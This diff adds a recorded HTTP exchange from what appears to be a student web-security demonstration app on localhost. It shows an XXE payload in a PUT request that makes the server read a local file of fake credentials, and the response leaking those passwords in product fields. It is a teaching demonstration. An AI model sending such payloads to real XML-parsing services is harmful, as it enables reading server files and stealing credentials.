@@ -1,0 +1,25 @@
+Request:
+PUT /xxe/products/1 HTTP/1.1
+Host: localhost:8080
+Content-Type: text/plain
+Content-Length: 320
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE yhn [ <!ENTITY xxe SYSTEM "file:///C:\Users\Yalchan Niyaziev\Documents\yhn_projects\Master_CyberSecurity\web-app-security-vulnerabilities-demonstration-app\fakeCredentials\passwords.yaml"> ]>
+<Product>
+    <name>&xxe;</name>
+    <category>&xxe;</category>
+</Product>
+
+
+
+Response:
+
+{
+    "id": 1,
+    "name": "passwords:\n  johny: \"weakPass\"\n  daemon: \"123456789\"\n  admin: \"admin1234\"",
+    "category": "passwords:\n  johny: \"weakPass\"\n  daemon: \"123456789\"\n  admin: \"admin1234\"",
+    "imageUrl": null,
+    "price": 333.6,
+    "description": "The new model of popular phone"
+}
